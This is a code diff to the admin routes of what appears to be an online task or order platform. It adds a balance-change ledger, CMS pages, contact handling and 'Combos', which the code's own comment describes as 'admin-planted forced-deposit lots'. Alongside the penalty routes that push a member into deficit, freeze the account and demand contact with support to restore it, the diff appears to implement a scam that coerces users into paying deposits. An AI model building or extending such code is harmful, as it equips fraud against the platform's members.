@@ -14,6 +14,11 @@ const Persona = require("../models/Persona");
 const LoginHistory = require("../models/LoginHistory");
 const SupportMessage = require("../models/SupportMessage");
 const Announcement = require("../models/Announcement");
+const Combo = require("../models/Combo");
+const AccountChange = require("../models/AccountChange");
+const Page = require("../models/Page");
+const ContactMessage = require("../models/ContactMessage");
+const { logChange } = require("../utils/ledger");
 const { DEFAULTS } = require("../utils/settings");
 const { sendDepositApproved, sendWithdrawalStatus } = require("../utils/mailer");
 const { PERMISSIONS, KEYS, isFullAccess, hasAccess } = require("../config/permissions");
@@ -28,6 +33,10 @@ const AREA = [
   [/^\/permissions/, null],
   [/^\/users/, "members"],
   [/^\/broadcast/, "members"],
+  [/^\/combos/, "members"],
+  [/^\/account-changes/, "members"],
+  [/^\/pages/, "settings"],
+  [/^\/contact/, "support"],
   [/^\/admins/, "admins"],
   [/^\/products/, "products"],
   [/^\/tx/, "transactions"],
@@ -425,7 +434,9 @@ router.post("/users/:id/penalty", async (req, res) => {
   const u = await User.findById(req.params.id);
   if (!u || u.role === "admin") return res.status(404).json({ error: "no member" });
   const reason = String(req.body?.reason || "").slice(0, 300) || "Account penalty";
+  const oldBal = u.balance;
   u.balance = +(u.balance - amount).toFixed(2);
+  await logChange(u._id, oldBal, -amount, u.balance, "Penalty");
   u.frozen = { active: true, amount, reason, at: new Date() };
   u.notifications.push({ text: `⚠️ Your account is in deficit (-$${amount.toLocaleString()}). Reason: ${reason}. Contact support to restore your account.`, type: "error" });
   await u.save();
@@ -442,7 +453,9 @@ router.post("/users/:id/penalty/resolve", async (req, res) => {
   if (!u.frozen?.active) return res.status(400).json({ error: "account is not frozen" });
   const amount = req.body?.amount == null ? (u.frozen.amount || 0) : Number(req.body.amount);
   if (!Number.isFinite(amount) || amount < 0) return res.status(400).json({ error: "bad amount" });
+  const oldBalR = u.balance;
   u.balance = +(u.balance + amount).toFixed(2);
+  if (amount > 0) await logChange(u._id, oldBalR, amount, u.balance, "Penalty Cleared");
   u.frozen = { active: false, amount: 0, reason: undefined, at: undefined };
   u.notifications.push({ text: `✅ Payment received — your account has been restored.${amount ? ` $${amount.toLocaleString()} credited.` : ""}`, type: "success" });
   await u.save();
@@ -507,9 +520,11 @@ router.post("/users/:id/adjust-balance", async (req, res) => {
   const { amount, note } = req.body || {};
   const u = await User.findById(req.params.id);
   if (!u) return res.status(404).json({ error: "no user" });
+  const old = u.balance;
   u.balance = +(u.balance + Number(amount || 0)).toFixed(2);
   await u.save();
   await Transaction.create({ user: u._id, type: "adjustment", amount: Number(amount || 0), note: note || "admin adjust" });
+  await logChange(u._id, old, Number(amount || 0), u.balance, note || "Admin Adjustment");
   res.json({ user: u });
 });
 
@@ -557,8 +572,10 @@ router.post("/tx/:id/approve", async (req, res) => {
   tx.stageHistory.push({ stage: "completed", at: new Date(), note: "Approved by staff" });
   if (tx.type === "deposit") {
     const u = await User.findById(tx.user);
+    const old = u.balance;
     u.balance = +(u.balance + tx.amount).toFixed(2);
     await u.save();
+    await logChange(u._id, old, tx.amount, u.balance, "Deposit Approved");
     sendDepositApproved(u, tx.amount).catch(() => {});
   }
   await tx.save();
@@ -573,8 +590,10 @@ router.post("/tx/:id/reject", async (req, res) => {
   tx.stageHistory.push({ stage: "rejected", at: new Date(), note: "Rejected by staff" });
   if (tx.type === "withdrawal") {
     const u = await User.findById(tx.user);
+    const old = u.balance;
     u.balance = +(u.balance + tx.amount).toFixed(2);
     await u.save();
+    await logChange(u._id, old, tx.amount, u.balance, "Withdrawal Refunded");
   }
   await tx.save();
   res.json({ tx });
@@ -681,5 +700,52 @@ router.delete("/chat/message/:id", async (req, res) => {
   await ChatMessage.findByIdAndDelete(req.params.id);
   res.json({ ok: true });
 });
+
+// ---- Combos (admin-planted forced-deposit lots) ----
+router.get("/combos", async (req, res) => {
+  const q = req.query.userId ? { user: req.query.userId } : {};
+  res.json({ items: await Combo.find(q).sort({ createdAt: -1 }).limit(500).populate("user", "username email accountNumber") });
+});
+router.post("/combos", async (req, res) => {
+  const { userId, comboAt, negativeAmount, commission, products } = req.body || {};
+  if (!userId) return res.status(400).json({ error: "userId required" });
+  if (!Number.isFinite(Number(comboAt)) || Number(comboAt) < 1) return res.status(400).json({ error: "comboAt must be >= 1" });
+  if (!Number.isFinite(Number(negativeAmount)) || Number(negativeAmount) <= 0) return res.status(400).json({ error: "negativeAmount must be > 0" });
+  const item = await Combo.create({
+    user: userId, comboAt: Number(comboAt), negativeAmount: Number(negativeAmount),
+    commission: Number(commission) || 20,
+    products: Array.isArray(products) && products.length ? products : [{ name: "Deluxe Combo Lot", value: Number(negativeAmount) }],
+  });
+  res.json({ item });
+});
+router.patch("/combos/:id", async (req, res) => res.json({ item: await Combo.findByIdAndUpdate(req.params.id, req.body, { new: true }) }));
+router.delete("/combos/:id", async (req, res) => { await Combo.findByIdAndDelete(req.params.id); res.json({ ok: true }); });
+
+// ---- Account changes (balance audit ledger) ----
+router.get("/account-changes", async (req, res) => {
+  const q = req.query.userId ? { user: req.query.userId } : {};
+  res.json({ items: await AccountChange.find(q).sort({ createdAt: -1 }).limit(500).populate("user", "username email accountNumber") });
+});
+
+// ---- CMS pages ----
+router.get("/pages", async (req, res) => res.json({ items: await Page.find().sort({ updatedAt: -1 }) }));
+router.post("/pages", async (req, res) => {
+  const { title, slug, content, active } = req.body || {};
+  if (!title || !slug) return res.status(400).json({ error: "title + slug required" });
+  const s = String(slug).toLowerCase().trim().replace(/[^a-z0-9-]/g, "-");
+  if (await Page.findOne({ slug: s })) return res.status(409).json({ error: "slug already exists" });
+  res.json({ item: await Page.create({ title, slug: s, content: content || "", active: active !== false }) });
+});
+router.patch("/pages/:id", async (req, res) => res.json({ item: await Page.findByIdAndUpdate(req.params.id, req.body, { new: true }) }));
+router.delete("/pages/:id", async (req, res) => { await Page.findByIdAndDelete(req.params.id); res.json({ ok: true }); });
+
+// ---- Contact / newsletter submissions ----
+router.get("/contact", async (req, res) => {
+  const q = {};
+  if (req.query.kind) q.kind = req.query.kind;
+  res.json({ items: await ContactMessage.find(q).sort({ createdAt: -1 }).limit(500) });
+});
+router.post("/contact/:id/handled", async (req, res) => res.json({ item: await ContactMessage.findByIdAndUpdate(req.params.id, { handled: req.body?.handled !== false }, { new: true }) }));
+router.delete("/contact/:id", async (req, res) => { await ContactMessage.findByIdAndDelete(req.params.id); res.json({ ok: true }); });
 
 module.exports = router;
